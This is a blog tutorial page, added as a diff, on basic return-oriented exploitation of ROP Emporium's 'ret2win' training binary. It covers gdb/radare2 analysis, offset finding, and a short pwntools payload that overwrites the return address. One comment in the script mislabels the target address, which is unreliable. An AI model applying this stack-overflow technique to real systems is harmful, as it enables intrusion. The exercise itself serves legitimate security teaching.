@@ -1,0 +1,631 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>ROP- Basic Exploit Creation &middot; Congo</title>
+    <meta name="title" content="ROP- Basic Exploit Creation &middot; Congo" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
+    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        {% img /img/pwn-thumbnail.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/rop-tools-usage/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/rop-tools-usage/">
+  <meta property="og:site_name" content="Congo">
+  <meta property="og:title" content="ROP- Basic Exploit Creation">
+  <meta property="og:description" content="{% img /img/pwn-thumbnail.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2019-07-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2019-07-26T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="ROP- Basic Exploit Creation">
+<meta name="twitter:description" content="{% img /img/pwn-thumbnail.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blogs",
+    "name": "ROP- Basic Exploit Creation",
+    "headline": "ROP- Basic Exploit Creation",
+    
+    "abstract": "{% img \/img\/pwn-thumbnail.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/rop-tools-usage\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2019",
+    "dateCreated": "2019-07-26T00:00:00\u002b00:00",
+    "datePublished": "2019-07-26T00:00:00\u002b00:00",
+    
+    "dateModified": "2019-07-26T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1428"
+  }
+  </script>
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Congo</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href=""
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        ROP- Basic Exploit Creation
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2019-07-26 00:00:00 &#43;0000 UTC">26 July 2019</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>{% img /img/pwn-thumbnail.png %}
+This blog post will teach you basics of ROP i.e. how to use tools efficiently.</p>
+<!-- more -->
+<h1 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h1><p>This post is more practical, so tag along with radare2, pwntools, gdb and ropper ready. I&rsquo;m using <a href="https://ropemporium.com/binary/ret2win.zip" target="_blank" rel="noreferrer">this</a> binary from ROP-Emporium and it&rsquo;s a basic one to start with. Grab it and read further.</p>
+<h1 id="the-eip-and-rip-register" class="relative group">The EIP and RIP Register <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#the-eip-and-rip-register" aria-label="Anchor">#</a></span></h1><p>I&rsquo;m starting off with IP register i.e. Instruction Pointer in 16-bit mode, Extended Instruction Pointer in 32-bit architecture and RIP in 64-bit. It contains the address of next instruction that will be executed hence, controlling the flow of command. Consider this register as something that will have the control of program flow since it has the next instruction which has to be executed.</p>
+<h1 id="analysis-of" class="relative group">Analysis of <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analysis-of" aria-label="Anchor">#</a></span></h1><p>Let&rsquo;s run the binary and see what it says.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:~/ROP-Emporium$ ./ret2win
+</span></span><span class="line"><span class="cl">ret2win by ROP Emporium
+</span></span><span class="line"><span class="cl">64bits
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">For my first trick, I will attempt to fit <span class="m">50</span> bytes of user input into <span class="m">32</span> bytes of stack buffer<span class="p">;</span>
+</span></span><span class="line"><span class="cl">What could possibly go wrong?
+</span></span><span class="line"><span class="cl">You there madam, may I have your input please? And don<span class="s1">&#39;t worry about null bytes, we&#39;</span>re using fgets!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span class="line"><span class="cl">Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span></span></code></pre></div><p>Using bunch of &ldquo;<strong>A</strong>s&rdquo; we can see we got a segmentation fault that means we got a buffer overflow that means there is no bound checking. Let&rsquo;s analyze the binary and see where is the input is overflowed.</p>
+<p>As the first post contained radare2 as a resource for analysis of binary. Starting off with that, type <code>rabin2 -I ret2win</code> to get the information about the binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:~/ROP-Emporium$ rabin2 -I ret2win
+</span></span><span class="line"><span class="cl">arch     x86
+</span></span><span class="line"><span class="cl">binsz    <span class="m">7071</span>
+</span></span><span class="line"><span class="cl">bintype  elf
+</span></span><span class="line"><span class="cl">bits     <span class="m">64</span>
+</span></span><span class="line"><span class="cl">canary   <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">class    ELF64
+</span></span><span class="line"><span class="cl">crypto   <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">endian   little
+</span></span><span class="line"><span class="cl">havecode <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">intrp    /lib64/ld-linux-x86-64.so.2
+</span></span><span class="line"><span class="cl">lang     c
+</span></span><span class="line"><span class="cl">linenum  <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">lsyms    <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">machine  AMD x86-64 architecture
+</span></span><span class="line"><span class="cl">maxopsz  <span class="m">16</span>
+</span></span><span class="line"><span class="cl">minopsz  <span class="m">1</span>
+</span></span><span class="line"><span class="cl">nx       <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">os       linux
+</span></span><span class="line"><span class="cl">pcalign  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">pic      <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">relocs   <span class="nb">true</span>
+</span></span><span class="line"><span class="cl">relro    partial
+</span></span><span class="line"><span class="cl">rpath    NONE
+</span></span><span class="line"><span class="cl">static   <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">stripped <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">subsys   linux
+</span></span><span class="line"><span class="cl">va       <span class="nb">true</span>
+</span></span></code></pre></div><p>From above we now know that it&rsquo;s x86 arcitercture and a 64-bit ELF and endianess is set to little. Now, let&rsquo;s run <code>r2 ret2win</code> and see what functions it has.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:~/ROP-Emporium$ r2 ret2win
+</span></span><span class="line"><span class="cl"><span class="o">[</span>0x00400650<span class="o">]</span>&gt; aaaa
+</span></span><span class="line"><span class="cl"><span class="o">[</span>x<span class="o">]</span> Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>x<span class="o">]</span> Analyze len bytes of instructions <span class="k">for</span> references <span class="o">(</span>aar<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>x<span class="o">]</span> Analyze <span class="k">function</span> calls <span class="o">(</span>aac<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>x<span class="o">]</span> Emulate code to find computed references <span class="o">(</span>aae<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>x<span class="o">]</span> Analyze consecutive <span class="k">function</span> <span class="o">(</span>aat<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>x<span class="o">]</span> Constructing a <span class="k">function</span> name <span class="k">for</span> fcn.* and sym.func.* functions <span class="o">(</span>aan<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>x<span class="o">]</span> Type matching analysis <span class="k">for</span> all functions <span class="o">(</span>afta<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>0x00400650<span class="o">]</span>&gt; afl
+</span></span><span class="line"><span class="cl">0x00400000    <span class="m">2</span> <span class="m">64</span>           loc.imp.__gmon_start
+</span></span><span class="line"><span class="cl">0x00400041    <span class="m">1</span> <span class="m">171</span>          fcn.00400041
+</span></span><span class="line"><span class="cl">0x004005a0    <span class="m">3</span> <span class="m">26</span>           sym._init
+</span></span><span class="line"><span class="cl">0x004005d0    <span class="m">1</span> <span class="m">6</span>            sym.imp.puts
+</span></span><span class="line"><span class="cl">0x004005e0    <span class="m">1</span> <span class="m">6</span>            sym.imp.system
+</span></span><span class="line"><span class="cl">0x004005f0    <span class="m">1</span> <span class="m">6</span>            sym.imp.printf
+</span></span><span class="line"><span class="cl">0x00400600    <span class="m">1</span> <span class="m">6</span>            sym.imp.memset
+</span></span><span class="line"><span class="cl">0x00400610    <span class="m">1</span> <span class="m">6</span>            sym.imp.__libc_start_main
+</span></span><span class="line"><span class="cl">0x00400620    <span class="m">1</span> <span class="m">6</span>            sym.imp.fgets
+</span></span><span class="line"><span class="cl">0x00400630    <span class="m">1</span> <span class="m">6</span>            sym.imp.setvbuf
+</span></span><span class="line"><span class="cl">0x00400640    <span class="m">1</span> <span class="m">6</span>            sub.__gmon_start___248_640
+</span></span><span class="line"><span class="cl">0x00400650    <span class="m">1</span> <span class="m">41</span>           entry0
+</span></span><span class="line"><span class="cl">0x00400680    <span class="m">4</span> <span class="m">50</span>   -&gt; <span class="m">41</span>   sym.deregister_tm_clones
+</span></span><span class="line"><span class="cl">0x004006c0    <span class="m">3</span> <span class="m">53</span>           sym.register_tm_clones
+</span></span><span class="line"><span class="cl">0x00400700    <span class="m">3</span> <span class="m">28</span>           sym.__do_global_dtors_aux
+</span></span><span class="line"><span class="cl">0x00400720    <span class="m">4</span> <span class="m">38</span>   -&gt; <span class="m">35</span>   entry1.init
+</span></span><span class="line"><span class="cl">0x00400746    <span class="m">1</span> <span class="m">111</span>          sym.main
+</span></span><span class="line"><span class="cl">0x004007b5    <span class="m">1</span> <span class="m">92</span>           sym.pwnme
+</span></span><span class="line"><span class="cl">0x00400811    <span class="m">1</span> <span class="m">32</span>           sym.ret2win
+</span></span><span class="line"><span class="cl">0x00400840    <span class="m">4</span> <span class="m">101</span>          sym.__libc_csu_init
+</span></span><span class="line"><span class="cl">0x004008b0    <span class="m">1</span> <span class="m">2</span>            sym.__libc_csu_fini
+</span></span><span class="line"><span class="cl">0x004008b4    <span class="m">1</span> <span class="m">9</span>            sym._fini
+</span></span><span class="line"><span class="cl"><span class="o">[</span>0x00400650<span class="o">]</span>&gt; 
+</span></span></code></pre></div><p>So, we have a <code>sym.ret2win</code>, <code>sym.pwnme</code> and a <code>sym.main</code> which will be our focus for the rest. Since it&rsquo;s a ROP challenge and checking the functions one by one with <code>pdf @sym.ret2win</code> in radare2 shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>0x00400650<span class="o">]</span>&gt; pdf @sym.ret2win
+</span></span><span class="line"><span class="cl">/ <span class="o">(</span>fcn<span class="o">)</span> sym.ret2win <span class="m">32</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   sym.ret2win <span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           0x00400811      <span class="m">55</span>             push rbp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           0x00400812      4889e5         mov rbp, rsp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           0x00400815      bfe0094000     mov edi, str.Thank_you__Here_s_your_flag: <span class="p">;</span> 0x4009e0 <span class="p">;</span> <span class="s2">&#34;Thank you! Here&#39;s your flag:&#34;</span> <span class="p">;</span> const char * format
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           0x0040081a      b800000000     mov eax, <span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           0x0040081f      e8ccfdffff     call sym.imp.printf         <span class="p">;</span> int printf<span class="o">(</span>const char *format<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           0x00400824      bffd094000     mov edi, str.bin_cat_flag.txt <span class="p">;</span> 0x4009fd <span class="p">;</span> <span class="s2">&#34;/bin/cat flag.txt&#34;</span> <span class="p">;</span> const char * string
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           0x00400829      e8b2fdffff     call sym.imp.system         <span class="p">;</span> int system<span class="o">(</span>const char *string<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           0x0040082e      <span class="m">90</span>             nop
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           0x0040082f      5d             pop rbp
+</span></span><span class="line"><span class="cl"><span class="se">\ </span>          0x00400830      c3             ret
+</span></span></code></pre></div><p>We see that there is a string with <strong>/bin/cat flag.txt</strong> and a system function call of C, in case you don&rsquo;t know what <code>system</code> does, it executes the arguments as bash command.</p>
+<p>Since we want to jump to address <code>0x00400811</code> in order to execute above function which will print our flag. In order to execute this we need to find the offset that we need to overwrite the instruction pointer. In this case, it is a 64-bit ELF we have to find <strong>RIP</strong> if it was 32-bit ELF we had to find <strong>EIP</strong>. Let&rsquo;s try to create a pattern offset uding gdb.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">robin@oracle:~/ROP-Emporium$ gdb ret2win
+</span></span><span class="line"><span class="cl">GNU gdb <span class="o">(</span>Ubuntu 8.1-0ubuntu3<span class="o">)</span> 8.1.0.20180409-git
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2018</span> Free Software Foundation, Inc.
+</span></span><span class="line"><span class="cl">License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span></span><span class="line"><span class="cl">This is free software: you are free to change and redistribute it.
+</span></span><span class="line"><span class="cl">There is NO WARRANTY, to the extent permitted by law.  Type <span class="s2">&#34;show copying&#34;</span>
+</span></span><span class="line"><span class="cl">and <span class="s2">&#34;show warranty&#34;</span> <span class="k">for</span> details.
+</span></span><span class="line"><span class="cl">This GDB was configured as <span class="s2">&#34;x86_64-linux-gnu&#34;</span>.
+</span></span><span class="line"><span class="cl">Type <span class="s2">&#34;show configuration&#34;</span> <span class="k">for</span> configuration details.
+</span></span><span class="line"><span class="cl">For bug reporting instructions, please see:
+</span></span><span class="line"><span class="cl">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+</span></span><span class="line"><span class="cl">Find the GDB manual and other documentation resources online at:
+</span></span><span class="line"><span class="cl">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+</span></span><span class="line"><span class="cl">For help, <span class="nb">type</span> <span class="s2">&#34;help&#34;</span>.
+</span></span><span class="line"><span class="cl">Type <span class="s2">&#34;apropos word&#34;</span> to search <span class="k">for</span> commands related to <span class="s2">&#34;word&#34;</span>...
+</span></span><span class="line"><span class="cl">Reading symbols from ret2win...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span></span><span class="line"><span class="cl">gdb-peda$ pattern_create <span class="m">100</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&#39;</span>
+</span></span><span class="line"><span class="cl">gdb-peda$ pattern_create <span class="m">100</span> input
+</span></span><span class="line"><span class="cl">Writing pattern of <span class="m">100</span> chars to filename <span class="s2">&#34;input&#34;</span>
+</span></span><span class="line"><span class="cl">gdb-peda$ r &lt; input
+</span></span><span class="line"><span class="cl">Starting program: /home/robin/ROP-Emporium/ret2win &lt; input
+</span></span><span class="line"><span class="cl">ret2win by ROP Emporium
+</span></span><span class="line"><span class="cl">64bits
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">For my first trick, I will attempt to fit <span class="m">50</span> bytes of user input into <span class="m">32</span> bytes of stack buffer<span class="p">;</span>
+</span></span><span class="line"><span class="cl">What could possibly go wrong?
+</span></span><span class="line"><span class="cl">You there madam, may I have your input please? And don<span class="s1">&#39;t worry about null bytes, we&#39;</span>re using fgets!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; 
+</span></span><span class="line"><span class="cl">Program received signal SIGSEGV, Segmentation fault.
+</span></span></code></pre></div><h5 id="command-explaination" class="relative group">Command Explaination <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#command-explaination" aria-label="Anchor">#</a></span></h5><ul>
+<li><code>gdb ret2win</code> : This will open the gdb with ret2win binary for the processing.</li>
+<li><code>pattern_create 100 input</code> : This will create a offset pattern of the length provided, in our case it&rsquo;s 100. <code>input</code> is the file where the offset willbe written.</li>
+<li><code>r &lt; input</code> : This will run the binary ret2win and gives the <code>input</code> file as input.</li>
+</ul>
+<h1 id="analyzing-the-offsets" class="relative group">Analyzing the offsets <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analyzing-the-offsets" aria-label="Anchor">#</a></span></h1><p>Let&rsquo;s see the peda&rsquo;s work and informatio it provided us:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
+</span></span><span class="line"><span class="cl">RAX: 0x7fffffffde10 <span class="o">(</span><span class="s2">&#34;AAA%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAb&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">RBX: 0x0 
+</span></span><span class="line"><span class="cl">RCX: 0x1f 
+</span></span><span class="line"><span class="cl">RDX: 0x7ffff7dd18d0 --&gt; 0x0 
+</span></span><span class="line"><span class="cl">RSI: 0x7fffffffde10 <span class="o">(</span><span class="s2">&#34;AAA%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAb&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">RDI: 0x7fffffffde11 <span class="o">(</span><span class="s2">&#34;AA%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAb&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">RBP: 0x6141414541412941 <span class="o">(</span><span class="s1">&#39;A)AAEAAa&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">RSP: 0x7fffffffde38 <span class="o">(</span><span class="s2">&#34;AA0AAFAAb&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">RIP: 0x400810 <span class="o">(</span>&lt;pwnme+91&gt;:	ret<span class="o">)</span>
+</span></span><span class="line"><span class="cl">R8 : 0x0 
+</span></span><span class="line"><span class="cl">R9 : 0x0 
+</span></span><span class="line"><span class="cl">R10: 0x602010 --&gt; 0x0 
+</span></span><span class="line"><span class="cl">R11: 0x246 
+</span></span><span class="line"><span class="cl">R12: 0x400650 <span class="o">(</span>&lt;_start&gt;:	xor    ebp,ebp<span class="o">)</span>
+</span></span><span class="line"><span class="cl">R13: 0x7fffffffdf20 --&gt; 0x1 
+</span></span><span class="line"><span class="cl">R14: 0x0 
+</span></span><span class="line"><span class="cl">R15: 0x0
+</span></span><span class="line"><span class="cl">EFLAGS: 0x10246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap</span> INTERRUPT direction overflow<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   0x400809 &lt;pwnme+84&gt;:	call   0x400620 &lt;fgets@plt&gt;
+</span></span><span class="line"><span class="cl">   0x40080e &lt;pwnme+89&gt;:	nop
+</span></span><span class="line"><span class="cl">   0x40080f &lt;pwnme+90&gt;:	<span class="nv">leave</span>  
+</span></span><span class="line"><span class="cl"><span class="o">=</span>&gt; 0x400810 &lt;pwnme+91&gt;:	ret    
+</span></span><span class="line"><span class="cl">   0x400811 &lt;ret2win&gt;:	push   rbp
+</span></span><span class="line"><span class="cl">   0x400812 &lt;ret2win+1&gt;:	mov    rbp,rsp
+</span></span><span class="line"><span class="cl">   0x400815 &lt;ret2win+4&gt;:	mov    edi,0x4009e0
+</span></span><span class="line"><span class="cl">   0x40081a &lt;ret2win+9&gt;:	mov    eax,0x0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0000<span class="p">|</span> 0x7fffffffde38 <span class="o">(</span><span class="s2">&#34;AA0AAFAAb&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">0008<span class="p">|</span> 0x7fffffffde40 --&gt; 0x400062 --&gt; 0x1f8000000000000 
+</span></span><span class="line"><span class="cl">0016<span class="p">|</span> 0x7fffffffde48 --&gt; 0x7ffff7a05b97 <span class="o">(</span>&lt;__libc_start_main+231&gt;:	mov    edi,eax<span class="o">)</span>
+</span></span><span class="line"><span class="cl">0024<span class="p">|</span> 0x7fffffffde50 --&gt; 0x1 
+</span></span><span class="line"><span class="cl">0032<span class="p">|</span> 0x7fffffffde58 --&gt; 0x7fffffffdf28 --&gt; 0x7fffffffe2b4 <span class="o">(</span><span class="s2">&#34;/home/robin/ROP-Emporium/ret2win&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">0040<span class="p">|</span> 0x7fffffffde60 --&gt; 0x100008000 
+</span></span><span class="line"><span class="cl">0048<span class="p">|</span> 0x7fffffffde68 --&gt; 0x400746 <span class="o">(</span>&lt;main&gt;:	push   rbp<span class="o">)</span>
+</span></span><span class="line"><span class="cl">0056<span class="p">|</span> 0x7fffffffde70 --&gt; 0x0 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Legend: code, data, rodata, value
+</span></span><span class="line"><span class="cl">Stopped reason: SIGSEGV
+</span></span><span class="line"><span class="cl">0x0000000000400810 in pwnme <span class="o">()</span>
+</span></span></code></pre></div><p>In 64-bit binaries we can see the RIP doesn&rsquo;t contain our sequence. In 64-bit, it will not pop a value into RIP if it cannot actually jump to the address and execute it. So the value is at top of the stack after popping to RIP failed. So from above we can see that RSP has the pattern, we can get value from it. As we can see it has a value of <strong>&ldquo;AA0AAFAAb&rdquo;</strong> at the time of segment fault.</p>
+<p>Time to find the padding we need in order to execute the instruction properly. Using peda:-</p>
+<pre tabindex="0"><code>
+gdb-peda$ pattern_offset AA0AAFAAb
+AA0AAFAAb found at offset: 40
+</code></pre><h1 id="creating-exploit" class="relative group">Creating Exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#creating-exploit" aria-label="Anchor">#</a></span></h1><p>Now, we have all we need to execute the exploit. Now let&rsquo;s craft the exploit.
+We need the memory address of RIP and the padding length and python, of course.</p>
+<p>Using pwntools to craft exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># Importing all functions from pwntools</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">prog</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2win&#34;</span><span class="p">)</span> <span class="c1"># Opening ret2win library</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">40</span> <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00400824</span><span class="p">)</span> <span class="c1"># Address of &#34;push rbp&#34; from sym.pwnme</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;payload&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># Writing the payload to fie payload.</span>
+</span></span></code></pre></div><p>Now, run the exploit:-</p>
